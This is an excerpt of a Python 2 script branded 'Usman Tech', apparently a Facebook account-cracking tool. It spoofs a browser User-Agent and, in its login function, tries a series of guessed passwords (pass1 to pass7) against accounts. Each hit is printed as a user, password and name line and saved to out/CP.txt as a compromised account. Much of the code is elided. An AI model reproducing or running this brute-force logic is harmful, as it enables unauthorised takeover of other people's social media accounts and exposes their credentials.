...
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; chorme brower/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
...
─██████████████─██████████████─██████──────────██████─██████──██████─██████──────────██████
───────────────────────────────────────────────────────────────────────────────────────────                      
\033[1;96m                  e    Usman  Tech Updated 0.3                   
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦
"""
def tik():
	titik = ['.   ','..  ','... ']
...
jalan("   \033[1;93m Welcome to Usman Tech Creations ")
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('xdg-open https://www.Youtube.com/UCQdBT_TMMD3l6CrS6JxiUSQ')
    else:
...
def login():
	...
	try:
		...
		if 'checkpoint' in url:
			print("\n\033[1;97m[!] Your Account is on opmen ")
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[After1Days] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After1Days] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[After1Days] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
									cek = open("out/CP.txt", "a")
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After1Days] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[After1Days] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
															cek = open("out/CP.txt", "a")
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[After1Days] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																	cek = open("out/CP.txt", "a")
